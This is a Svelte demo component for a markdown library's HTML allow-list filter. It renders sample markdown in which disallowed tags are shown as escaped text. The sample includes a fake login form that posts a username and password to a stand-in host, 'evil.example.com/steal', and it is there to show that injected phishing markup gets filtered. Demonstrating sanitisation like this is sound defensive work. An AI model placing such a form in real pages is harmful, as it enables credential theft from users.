<script lang="ts">
    import SvelteMarkdown, { allowHtmlOnly } from '@humanspeak/svelte-markdown'

    // Allow-list a tight set of formatting tags. Anything outside the list
    // (script, iframe, form, etc.) is rendered as escaped text so a reader
    // can see exactly which tags were filtered out.
    const html = allowHtmlOnly([
        'strong',
        'em',
        'div',
        'span',
        'details',
        'summary',
        'sup',
        'sub',
        'cite',
        'a'
    ])

    const markdown = `## HTML Filtering Demo

This paragraph has **bold** and *italic* markdown formatting.

<div>
This is inside an allowed HTML div element.
</div>

<strong>HTML strong tag</strong> and <em>HTML em tag</em>.

<details>
<summary>Click to expand</summary>
Hidden content inside details/summary tags.
</details>

<iframe src="https://example.com" title="example iframe"></iframe>

<form action="https://evil.example.com/steal" method="POST">
  <strong>Fake login injected by untrusted markdown</strong>
  <input type="text" placeholder="Username" />
  <input type="password" placeholder="Password" />
  <button type="submit">Sign in</button>
</form>
`
</script>

<div class="hf-demo hf-demo-safe">
    <div class="hf-demo-bar">
        <span>POLICY / SAFE ONLY</span>
        <span>allowHtmlOnly</span>
    </div>
    <div class="hf-demo-preview">
        <div class="hf-markdown prose prose-sm dark:prose-invert max-w-none">
            <SvelteMarkdown source={markdown} renderers={{ html }} />
        </div>
    </div>
</div>

<style>
    .hf-demo {
        color: var(--brut-ink, currentColor);
        background:
            linear-gradient(135deg, var(--hf-wash), transparent 46%), var(--brut-bg, Canvas);
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        font-family: 'Inter Variable', 'Inter', system-ui, sans-serif;
    }
    .hf-demo-bar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        border-bottom: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        padding: 9px 12px;
        color: var(--brut-ink-3, color-mix(in srgb, currentColor 58%, transparent));
        font-family: 'JetBrains Mono Variable', 'JetBrains Mono', ui-monospace, monospace;
        font-size: 11px;
        letter-spacing: 0.04em;
        text-transform: uppercase;
    }
    .hf-demo-bar span:first-child {
        color: var(--hf-accent);
        font-weight: 700;
    }
    .hf-demo-preview {
        padding: clamp(16px, 3vw, 28px);
    }
    .hf-markdown {
        color: var(--brut-ink-2, currentColor);
    }
    .hf-markdown :global(h2) {
        color: var(--brut-ink, currentColor);
        letter-spacing: 0;
    }
    .hf-markdown :global(div) {
        border: 1px solid var(--hf-accent-soft);
        background: var(--hf-surface);
        color: var(--brut-ink, currentColor);
        padding: 12px 14px;
    }
    .hf-markdown :global(details) {
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        background: var(--brut-bg-2, rgba(127, 127, 127, 0.06));
        padding: 12px 14px;
    }
    .hf-markdown :global(summary) {
        color: var(--hf-accent);
        cursor: pointer;
        font-weight: 700;
    }
    .hf-demo-safe {
        --hf-accent: #059669;
        --hf-accent-soft: rgba(5, 150, 105, 0.32);
        --hf-surface: rgba(236, 253, 245, 0.82);
        --hf-wash: rgba(5, 150, 105, 0.11);
    }
    :global(html.dark) .hf-demo-safe {
        --hf-accent: #34d399;
        --hf-accent-soft: rgba(52, 211, 153, 0.34);
        --hf-surface: rgba(6, 78, 59, 0.24);
        --hf-wash: rgba(52, 211, 153, 0.1);
    }
    @media (max-width: 640px) {
        .hf-demo-bar {
            align-items: flex-start;
            flex-direction: column;
        }
    }
</style>
